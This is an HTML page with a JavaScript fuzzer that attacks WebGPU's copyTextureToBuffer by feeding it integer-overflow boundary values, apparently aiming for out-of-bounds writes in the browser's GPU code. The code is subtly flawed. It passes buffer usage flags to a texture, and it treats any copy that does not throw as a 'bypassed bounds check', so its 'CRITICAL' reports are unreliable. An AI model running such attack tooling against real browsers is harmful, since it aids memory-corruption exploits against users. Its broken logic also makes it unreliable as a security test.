<!DOCTYPE html>
<html>
<head>
    <title>WebGPU Texture Math Fuzzer</title>
    <style>body { background: #111; color: #0f0; font-family: monospace; }</style>
</head>
<body>
    <h2>Attacking copyTextureToBuffer Math</h2>
    <button id="fuzzBtn" style="padding:10px; background:#f00; color:#fff; font-weight:bold;">FUZZ TEXTURE MATH</button>
    <pre id="log"></pre>

    <script>
        const logEl = document.getElementById('log');
        function log(msg) { logEl.innerText = msg + '\n' + logEl.innerText; }

        // Array of "evil" integers designed to cause overflows
        const poisonValues = [
            0, 1, 2, 255, 256, 
            0x7FFFFFFF, 0x80000000, // 32-bit max
            0xFFFFFFFF, 0xFFFFFFFE, // 32-bit unsigned max
            0x100000000,            // 32-bit overflow boundary
            4294967295, 4294967296  // JS Number boundaries
        ];

        function getPoison() {
            return poisonValues[Math.floor(Math.random() * poisonValues.length)];
        }

        async function runFuzzer() {
            const adapter = await navigator.gpu.requestAdapter();
            const device = await adapter.requestDevice();
            log("Device acquired. Starting 3D Texture OOB Fuzzer...");

            const buffer = device.createBuffer({
                size: 1024 * 1024 * 4, // 4MB valid buffer
                usage: GPUBufferUsage.COPY_DST | GPUBufferUsage.MAP_READ
            });

            const texture = device.createTexture({
                size: { width: 4, height: 4, depthOrArrayLayers: 2 },
                format: 'rgba8unorm',
                usage: GPUBufferUsage.COPY_SRC | GPUBufferUsage.RENDER_ATTACHMENT
            });

            let runs = 0;

            setInterval(() => {
                runs++;
                if(runs % 50 === 0) log(`[+] Executed ${runs} copy attempts...`);

                const encoder = device.createCommandEncoder();

                // Generate malicious copy dimensions
                // We want to trick the engine into thinking the copy is small, 
                // but the internal math wraps around and writes OOB.
                const evilBytesPerRow = getPoison();
                const evilRowsPerImage = getPoison();
                const evilDepth = getPoison();

                try {
                    encoder.copyTextureToBuffer(
                        { texture: texture },
                        { 
                            buffer: buffer, 
                            bytesPerRow: evilBytesPerRow, 
                            rowsPerImage: evilRowsPerImage 
                        },
                        { width: 4, height: 4, depthOrArrayLayers: evilDepth }
                    );

                    // If we reach here, the C++ bounds check FAILED to catch our bad math!
                    device.queue.submit([encoder.finish()]);
                    log(`[!] CRITICAL: Bypassed bounds check with bpr:${evilBytesPerRow}, rpi:${evilRowsPerImage}, depth:${evilDepth}`);

                } catch (e) {
                    // Normal behavior: WebGPU threw a validation error
                }
            }, 5); 
        }

        document.getElementById('fuzzBtn').addEventListener('click', runFuzzer);
    </script>
</body>
</html>
